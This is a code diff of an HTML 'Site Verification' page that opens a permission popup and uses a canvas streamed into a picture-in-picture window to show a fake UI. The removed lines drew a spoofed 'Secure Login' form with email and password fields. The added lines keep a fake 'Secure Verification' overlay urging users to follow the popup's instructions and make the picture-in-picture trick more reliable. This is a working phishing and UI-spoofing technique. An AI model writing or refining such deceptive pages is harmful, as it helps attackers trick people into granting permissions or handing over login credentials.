@@ -1,103 +1,51 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="UTF-8">
-<title>Verification Required</title>
-<style>
-body {
-  display:flex;
-  justify-content:center;
-  align-items:center;
-  height:100vh;
-  font-family:Arial;
-  background:#f0f0f0;
-}
-button {
-  padding:12px 20px;
-  background:#0dd438;
-  color:white;
-  border:none;
-  border-radius:6px;
-  cursor:pointer;
-}
-video {
-  display:none;
-}
-</style>
-</head>
+<html>
+<body style="display:flex;justify-content:center;align-items:center;height:100vh;font-family:Arial;">
 
-<body>
-
-<h2 style="position:absolute;top:200px;">Site Verification Required</h2>
 <button onclick="start()">Verify</button>
-
-<video id="vid" playsinline></video>
+<video id="vid" playsinline muted></video>
 
 <script>
 async function start() {
-  // 🔥 Open permission popup FIRST (same user gesture)
+  // ✅ 1. Open popup FIRST (guaranteed by user gesture)
   const popup = window.open(
     "permission.html",
     "perm",
-    "width=300,height=200,left=900,top=600"
+    "width=300,height=200"
   );
 
   const video = document.getElementById("vid");
 
+  // Create fake UI canvas
   const canvas = document.createElement("canvas");
   canvas.width = 400;
   canvas.height = 500;
   const ctx = canvas.getContext("2d");
 
-  function drawUI(step = 1) {
+  function draw() {
     ctx.fillStyle = "#fff";
-    ctx.fillRect(0, 0, canvas.width, canvas.height);
+    ctx.fillRect(0, 0, 400, 500);
 
     ctx.fillStyle = "#000";
     ctx.font = "20px Arial";
-
-    if (step === 1) {
-      ctx.fillText("Step 1: Verification", 80, 100);
-      ctx.fillText("Follow instructions in the popup", 40, 140);
-
-      ctx.fillStyle = "#0dd438";
-      ctx.fillRect(100, 200, 200, 50);
-      ctx.fillStyle = "#fff";
-      ctx.fillText("Continue", 140, 235);
-    } else {
-      ctx.fillText("Step 2: Secure Login", 70, 100);
-      ctx.fillText("Email:", 50, 160);
-      ctx.fillText("Password:", 50, 220);
-
-      ctx.strokeRect(150, 140, 180, 30);
-      ctx.strokeRect(150, 200, 180, 30);
-
-      ctx.fillStyle = "#4285f4";
-      ctx.fillRect(100, 280, 200, 50);
-      ctx.fillStyle = "#fff";
-      ctx.fillText("Sign in", 150, 315);
-    }
+    ctx.fillText("Secure Verification", 80, 120);
+    ctx.fillText("Follow popup instructions", 50, 160);
   }
 
-  let step = 1;
-  drawUI(step);
-
-  // Switch to login step after a few seconds
-  setTimeout(() => {
-    step = 2;
-    drawUI(step);
-  }, 4000);
+  draw();
 
   const stream = canvas.captureStream(30);
   video.srcObject = stream;
 
-  await video.play();
-  await video.requestPictureInPicture();
-
-  // Optional: auto close popup later (to simulate flow)
-  setTimeout(() => {
-    if (popup) popup.close();
-  }, 8000);
+  // ✅ 2. WAIT for video to start, THEN request PiP
+  video.onloadedmetadata = async () => {
+    try {
+      await video.play();
+      await video.requestPictureInPicture();
+    } catch (e) {
+      console.log("PiP blocked:", e);
+    }
+  };
 }
 </script>
 
